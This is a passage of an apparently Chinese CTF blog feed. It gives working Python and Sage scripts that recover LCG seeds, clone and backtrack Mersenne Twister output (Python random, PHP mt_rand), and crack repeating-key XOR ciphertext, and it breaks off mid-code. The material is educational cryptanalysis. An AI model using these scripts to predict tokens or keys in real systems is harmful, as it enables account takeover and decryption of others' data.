class="number">10</span>)])</span><br><span class="line">W1 = AL * delta_Y</span><br><span class="line">W2 = vector([round(RR(w) / m) * m - w <span class="keyword">for</span> w <span class="keyword">in</span> W1])</span><br><span class="line">delta_Z = AL.solve_right(W2)</span><br><span class="line">delta_X = delta_Y + delta_Z</span><br><span class="line">x0 = (inverse(a - <span class="number">1</span>, m) * (delta_X[<span class="number">0</span>] - b)) % m</span><br><span class="line">rand_iter = lcg(x0, a, b, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    x = next(rand_iter)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><h4 id="More-1"><a href="#More-1" class="headerlink" title="More"></a>More</h4><p><a href="https://www.math.cmu.edu/~af1p/Texfiles/RECONTRUNC.pdf" target="_blank" rel="noopener">https://www.math.cmu.edu/~af1p/Texfiles/RECONTRUNC.pdf</a></p><p>java的nextInt即适用该种LCG攻击模式，但网上多选择穷举（因为discard bits才只有$2^{16}$，暴力更省事-.-）</p><h3 id="MT-Predict-Backtrace"><a href="#MT-Predict-Backtrace" class="headerlink" title="MT - Predict/Backtrace"></a>MT - Predict/Backtrace</h3><h4 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="Theorem"></a>Theorem</h4><p>Mersenne Twister也是一种流行的PRNG算法，在python的random.getrandbits和php的mt_rand中均有使用</p><p>MT算法有624个32bits长的state，新一轮更新state的算法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] state;</span><br><span class="line"><span class="comment">// Iterate through the state</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">624</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// y is the first bit of the current number,</span></span><br><span class="line">  <span class="comment">// and the last 31 bits of the next number</span></span><br><span class="line">  <span class="keyword">int</span> y = (state[i] &amp; <span class="number">0x80000000</span>) + (state[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">  <span class="comment">// first bitshift y by 1 to the right</span></span><br><span class="line">  <span class="keyword">int</span> next = y &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// xor it with the 397th next number</span></span><br><span class="line">  next ^= state[(i + <span class="number">397</span>) % <span class="number">624</span>];</span><br><span class="line">  <span class="comment">// if y is odd, xor with magic number</span></span><br><span class="line">  <span class="keyword">if</span> ((y &amp; <span class="number">1L</span>) == <span class="number">1L</span>) &#123;</span><br><span class="line">    next ^= <span class="number">0x9908b0df</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// now we have the result</span></span><br><span class="line">  state[i] = next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从每个state生成等长(32bits)的随机数的算法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">currentIndex++;</span><br><span class="line"><span class="keyword">int</span> tmp = state[currentIndex];</span><br><span class="line">tmp ^= (tmp &gt;&gt;&gt; <span class="number">11</span>);</span><br><span class="line">tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>;</span><br><span class="line">tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>;</span><br><span class="line">tmp ^= (tmp &gt;&gt;&gt; <span class="number">18</span>);</span><br><span class="line"><span class="keyword">return</span> tmp;</span><br></pre></td></tr></table></figure><p>要破解MT算法，先决条件是要leak至少624个连续随机数(32bits)，或是说至少连续624*32bits二进制流</p><ul><li><p>Step 1(从随机数恢复state)</p><p>具体实现函数unBitshiftRightXor和unBitshiftLeftXor在exp中已给出，具体原理较容易推出，不在此赘述</p></li><li><p>Step 2(预测/回溯)</p><p>预测即正常生成新的state即可</p><p>回溯state则从state[623]开始（因为new_state[623]和(old_state[623],new_state[0],new_state[396])有关，且唯一未知的即为old_state[623]），回溯得到old_state[623]后，同理向前推即可</p></li></ul><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">rand_buffer = <span class="string">''</span></span><br><span class="line">states = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span><span class="params">()</span> -&gt; List[int]:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'random'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = [int(line.rstrip(<span class="string">'\n'</span>)) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line">    <span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    data = [random.getrandbits(32) for i in range(624)]</span></span><br><span class="line"><span class="string">    return data</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftLeftXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = (<span class="number">0xffffffff</span> &gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &lt;&lt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftRightXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = ((<span class="number">0xffffffff</span> &lt;&lt; (<span class="number">32</span> - shift)) &amp; <span class="number">0xffffffff</span>) &gt;&gt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &gt;&gt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_states</span><span class="params">(data: List[int])</span> -&gt; List[int]:</span></span><br><span class="line">    states = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">        value = data[i]</span><br><span class="line">        value = unBitshiftRightXor(value, <span class="number">18</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">        value = unBitshiftLeftXor(value, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        value = unBitshiftLeftXor(value, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        value = unBitshiftRightXor(value, <span class="number">11</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">        states.append(value)</span><br><span class="line">    <span class="keyword">return</span> states</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_randbits</span><span class="params">(bit_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(bit_length % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    <span class="keyword">global</span> rand_buffer</span><br><span class="line">    <span class="keyword">if</span> len(rand_buffer) &gt;= (bit_length // <span class="number">4</span>):</span><br><span class="line">        res = rand_buffer[:bit_length // <span class="number">4</span>]</span><br><span class="line">        rand_buffer = rand_buffer[bit_length // <span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            y = (states[i] &amp; <span class="number">0x80000000</span>) + (states[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            res = y &gt;&gt; <span class="number">1</span></span><br><span class="line">            res ^= states[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line">            <span class="keyword">if</span> y &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">                res ^= <span class="number">0x9908b0df</span></span><br><span class="line">            states[i] = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            value = states[i]</span><br><span class="line">            value ^= (value &gt;&gt; <span class="number">11</span>)</span><br><span class="line">            value ^= (value &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">            value ^= (value &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">            value ^= (value &gt;&gt; <span class="number">18</span>)</span><br><span class="line">            rand_buffer += hex(value)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">        res = rand_buffer[:bit_length // <span class="number">4</span>]</span><br><span class="line">        rand_buffer = rand_buffer[bit_length // <span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace_randbits</span><span class="params">(bit_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(bit_length % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">623</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        tmp = states[i]</span><br><span class="line">        tmp ^= states[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line">        <span class="keyword">if</span> (tmp &amp; <span class="number">0x80000000</span>) == <span class="number">0x80000000</span>:</span><br><span class="line">            tmp ^= <span class="number">0x9908b0df</span></span><br><span class="line">        res = (tmp &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x80000000</span>    <span class="comment">#the first bit of the res</span></span><br><span class="line">        <span class="comment"># the remaining 31 bits of the res</span></span><br><span class="line">        tmp = states[(i - <span class="number">1</span> + <span class="number">624</span>) % <span class="number">624</span>]</span><br><span class="line">        tmp ^= states[(i + <span class="number">396</span>) % <span class="number">624</span>]</span><br><span class="line">        <span class="keyword">if</span> (tmp &amp; <span class="number">0x80000000</span>) == <span class="number">0x80000000</span>:</span><br><span class="line">            tmp ^= <span class="number">0x9908b0df</span></span><br><span class="line">            res |= <span class="number">1</span></span><br><span class="line">        res |= (tmp &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x7fffffff</span></span><br><span class="line">        states[i] = res</span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> state <span class="keyword">in</span> states[-(bit_length // <span class="number">32</span> + <span class="number">1</span>):]:</span><br><span class="line">        state ^= (state &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        state ^= (state &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">        state ^= (state &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">        state ^= (state &gt;&gt; <span class="number">18</span>)</span><br><span class="line">        value += hex(state)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> value[-bit_length // <span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    data = read_data()</span><br><span class="line">    <span class="comment"># predict</span></span><br><span class="line">    states = crack_states(data[<span class="number">-624</span>:])</span><br><span class="line">    print(int(predict_randbits(<span class="number">32</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="comment"># backtrace</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    states = crack_states(data[:624])</span></span><br><span class="line"><span class="string">    print(backtrace_randbits(32 * 4))</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-2"><a href="#More-2" class="headerlink" title="More"></a>More</h4><p>或者python2下直接调用randcrack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">Rand = RandCrack()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'random'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = [int(line.rstrip(<span class="string">'\n'</span>)) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"><span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">    Rand.submit(data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(data)):</span><br><span class="line">    Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="keyword">print</span> Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br></pre></td></tr></table></figure><h3 id="视时间补充"><a href="#视时间补充" class="headerlink" title="视时间补充"></a>视时间补充</h3>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PRNG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(stream)</title>
      <link href="/2020/03/12/Summary-of-Crypto-in-CTF-stream/"/>
      <url>/2020/03/12/Summary-of-Crypto-in-CTF-stream/</url>
      
        <content type="html"><![CDATA[<h3 id="Stream-Cipher-Many-Time-Pad"><a href="#Stream-Cipher-Many-Time-Pad" class="headerlink" title="Stream Cipher - Many Time Pad"></a>Stream Cipher - Many Time Pad</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h4><ul><li><p>流密钥循环使用</p></li><li><p>猜测密钥长度</p><p>Hamming Distance（二进制下两个等长字符串的比特位差异）</p><p>大小写英文字符两两的平均Hamming距离为2 ~ 3，而任意字符两两的平均Hamming距离为4</p><script type="math/tex; mode=display">\therefore Assumed\quad c1=p1\oplus key,c2=p2\oplus key\\\\\because c1\oplus c2=p1\oplus p2\quad \therefore HammingDis(c1,c2)=HammingDis(p1,p2)</script><p>取合适的密钥长度上下界，进行分组计算汉明距离</p><p>将二元组(key_length, distance)按distance升序排列，取前五组验证即可</p></li><li><p>逐字节破解密钥</p><p>在猜测的密钥长度基础上，分割Cipher（用同一密钥字节加密的密文归入同组）</p><p><strong>字频分析</strong></p><p>遍历range(0xff)，和标准频率表（含空格和字母）内积最大的即猜测为正确密钥字节</p><p>因为不正确密钥字节下也可能内积很大，所以进行如下filter：</p><ul><li><p>decode(‘ascii’)出错 =&gt; return 0</p></li><li><p>cipher分组里为空格或字母的字符总数 &lt; len(cipher_fragment) // 1.5 =&gt; return 0</p></li></ul><p><strong>爆破空格</strong></p><p>基于空格和小写字母异或结果为对应大写字母，和大写字母异或结果为对应小写字母这一特性</p><p>对同一分组的cipher进行两两异或（相当于plain两两异或），记录每个字符与其他所有字符异或结果落在落在大小写字母和0x00上的次数，即可认为最大次数对应的字符位置上的明文为空格</p></li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">std_rate = &#123;<span class="string">' '</span>: <span class="number">0.18399868388580254</span>, <span class="string">'a'</span>: <span class="number">0.06528332604415538</span>, <span class="string">'b'</span>: <span class="number">0.012531342868095015</span>, <span class="string">'c'</span>: <span class="number">0.021018439349774747</span>, <span class="string">'d'</span>: <span class="number">0.03523431934577844</span>, <span class="string">'e'</span>: <span class="number">0.10261742470196494</span>, <span class="string">'f'</span>: <span class="number">0.019179805952664334</span>, <span class="string">'g'</span>: <span class="number">0.016178672025026573</span>, <span class="string">'h'</span>: <span class="number">0.050890812568726566</span>, <span class="string">'i'</span>: <span class="number">0.056467348737766584</span>, <span class="string">'j'</span>: <span class="number">0.0011847320400802188</span>, <span class="string">'k'</span>: <span class="number">0.006037640287976256</span>, <span class="string">'l'</span>: <span class="number">0.03310705983030898</span>,</span><br><span class="line">            <span class="string">'m'</span>: <span class="number">0.02089774777877722</span>, <span class="string">'n'</span>: <span class="number">0.056334978507447564</span>, <span class="string">'o'</span>: <span class="number">0.06194486601507346</span>, <span class="string">'p'</span>: <span class="number">0.014653281404481763</span>, <span class="string">'q'</span>: <span class="number">0.0009593791262805568</span>, <span class="string">'r'</span>: <span class="number">0.048625794552908115</span>, <span class="string">'s'</span>: <span class="number">0.051741663225580235</span>, <span class="string">'t'</span>: <span class="number">0.07413556318261176</span>, <span class="string">'u'</span>: <span class="number">0.023188985607049396</span>, <span class="string">'v'</span>: <span class="number">0.008010827191217628</span>, <span class="string">'w'</span>: <span class="number">0.018155155658972653</span>, <span class="string">'x'</span>: <span class="number">0.0014651754741116037</span>, <span class="string">'y'</span>: <span class="number">0.015511271998835988</span>, <span class="string">'z'</span>: <span class="number">0.0006457026385315064</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_xor</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(y) &gt; len(x):</span><br><span class="line">        x, y = y, x</span><br><span class="line">    <span class="keyword">return</span> bytes([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(x[:len(y)], y)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    dis = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bytes_xor(x, y):</span><br><span class="line">        dis += bin(byte).count(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">return</span> dis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key_length</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    average_distances = []</span><br><span class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">        cipher_fragments = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> key_length * (i + <span class="number">1</span>) &gt; len(cipher):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            cipher_fragments.append(</span><br><span class="line">                cipher[key_length * i: key_length * (i + <span class="number">1</span>)])</span><br><span class="line">        distance = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher_fragments) - <span class="number">1</span>):</span><br><span class="line">            distance += hamming_distance(</span><br><span class="line">                cipher_fragments[i], cipher_fragments[i + <span class="number">1</span>])</span><br><span class="line">        distance /= (key_length * len(cipher_fragments))</span><br><span class="line">        average_distances.append((key_length, distance))</span><br><span class="line">    average_distances.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> average_distances</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># 字频分析</span></span><br><span class="line"><span class="string">def dot_multiply(p):</span></span><br><span class="line"><span class="string">    rate = [0] * 27</span></span><br><span class="line"><span class="string">    tmp_len = 0</span></span><br><span class="line"><span class="string">    for _ in p:</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            _ = bytes([_]).decode('ascii')</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            return 0</span></span><br><span class="line"><span class="string">        _ = _.lower()</span></span><br><span class="line"><span class="string">        if _ in std_rate:</span></span><br><span class="line"><span class="string">            tmp_len += 1</span></span><br><span class="line"><span class="string">            if _ == ' ':</span></span><br><span class="line"><span class="string">                rate[0] += 1</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                rate[ord(_) - ord('a') + 1] += 1</span></span><br><span class="line"><span class="string">    if not tmp_len or tmp_len &lt; len(p) // 1.5:</span></span><br><span class="line"><span class="string">        return 0</span></span><br><span class="line"><span class="string">    rate = [i / tmp_len for i in rate]</span></span><br><span class="line"><span class="string">    res = rate[0] * std_rate[' ']</span></span><br><span class="line"><span class="string">    for i in range(1, 27):</span></span><br><span class="line"><span class="string">        res += rate[i] * std_rate[chr(ord('a') + i - 1)]</span></span><br><span class="line"><span class="string">    return res</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def crack_key_fragment(cipher_fragment):</span></span><br><span class="line"><span class="string">    max_dotmul_res = 0</span></span><br><span class="line"><span class="string">    pro_key_fragment = 0</span></span><br><span class="line"><span class="string">    for key_fragment in range(0xff):</span></span><br><span class="line"><span class="string">        key_set = [key_fragment] * len(cipher_fragment)</span></span><br><span class="line"><span class="string">        plain_fragment = bytes_xor(key_set, cipher_fragment)</span></span><br><span class="line"><span class="string">        dotmul_res = dot_multiply(plain_fragment)</span></span><br><span class="line"><span class="string">        if dotmul_res &gt; max_dotmul_res:</span></span><br><span class="line"><span class="string">            max_dotmul_res = dotmul_res</span></span><br><span class="line"><span class="string">            pro_key_fragment = key_fragment</span></span><br><span class="line"><span class="string">    return pro_key_fragment</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def crack_key(cipher, average_distances):</span></span><br><span class="line"><span class="string">    for key_length, _ in average_distances[:5]:</span></span><br><span class="line"><span class="string">        key = []</span></span><br><span class="line"><span class="string">        cipher_fragments = [[] for _ in range(key_length)]</span></span><br><span class="line"><span class="string">        for i, byte in enumerate(cipher):</span></span><br><span class="line"><span class="string">            cipher_fragments[i % key_length].append(byte)</span></span><br><span class="line"><span class="string">        for cipher_fragment in cipher_fragments:</span></span><br><span class="line"><span class="string">            key.append(crack_key_fragment(cipher_fragment))</span></span><br><span class="line"><span class="string">        print(bytes(key))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破空格</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_fragment</span><span class="params">(cipher_fragment)</span>:</span></span><br><span class="line">    max_possible = <span class="number">0</span></span><br><span class="line">    pro_space = <span class="number">0</span>  <span class="comment"># 空格下标索引</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">'ascii'</span>)</span><br><span 